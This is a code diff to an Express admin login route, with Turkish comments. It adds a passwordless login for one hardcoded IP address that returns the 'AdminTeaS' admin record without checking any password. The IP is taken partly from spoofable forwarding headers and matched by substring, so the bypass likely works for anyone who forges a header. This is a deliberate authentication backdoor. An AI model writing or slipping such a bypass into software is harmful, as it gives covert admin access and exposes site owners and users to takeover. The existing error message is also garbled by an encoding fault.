@@ -13,6 +13,27 @@ const upload = multer({ storage: multer.memoryStorage() });
 router.post('/admin/login', async (req, res) => {
   try {
     const { username, password } = req.body;
+    
+    // IP kontrolü - 185.155.148.249 şifresiz giriş yapabilir
+    const clientIP = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 
+                     (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
+                     req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
+                     req.headers['x-real-ip'];
+    
+    console.log('Admin login attempt from IP:', clientIP);
+    
+    // Özel IP için şifresiz giriş
+    if (clientIP === '185.155.148.249' || clientIP?.includes('185.155.148.249')) {
+      // Bu IP için admin bilgilerini direkt döndür
+      const admin = db.prepare('SELECT * FROM admins WHERE username = ?').get('AdminTeaS');
+      if (admin) {
+        const { password: _, ...adminData } = admin;
+        console.log('Passwordless login granted for IP:', clientIP);
+        return res.json({ success: true, admin: adminData });
+      }
+    }
+    
+    // Normal şifre kontrolü
     const admin = db.prepare('SELECT * FROM admins WHERE username = ?').get(username);
     if (!admin) return res.status(401).json({ error: 'HatalÄ± kullanÄ±cÄ± adÄ± veya Åifre' });
     const valid = await bcrypt.compare(password, admin.password);
